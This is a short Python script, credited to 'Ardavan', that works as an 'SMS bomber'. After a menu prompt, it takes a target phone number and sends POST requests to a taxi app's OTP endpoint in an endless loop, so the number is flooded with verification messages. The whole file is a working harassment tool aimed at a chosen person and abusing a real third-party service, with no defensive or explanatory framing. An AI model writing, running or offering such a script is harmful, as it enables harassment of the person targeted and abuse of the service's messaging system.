import requests
import os
from colorama import Fore, init
init()

red = Fore.LIGHTRED_EX
green = Fore.LIGHTGREEN_EX
yellow = Fore.LIGHTYELLOW_EX
blue = Fore.LIGHTBLUE_EX
white = Fore.WHITE

url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"

total = 0

print(red + "[1] "+ green + "Bombing A Number" + white)
print(red + "[2] "+ green + "Exit The Application" + yellow)

command = int(input("\n[@] " + "Dev By Ardavan | "))

if command == 1:
    
    send_to = input("Enter Phone Number With Country Code : ")
    
    while True:
        requests.post(url,data={"cellphone":send_to})
        total += 1
        print("Bombed =>", send_to, f"{total} Time(s)")
              
else:
    print("Wrong Command !")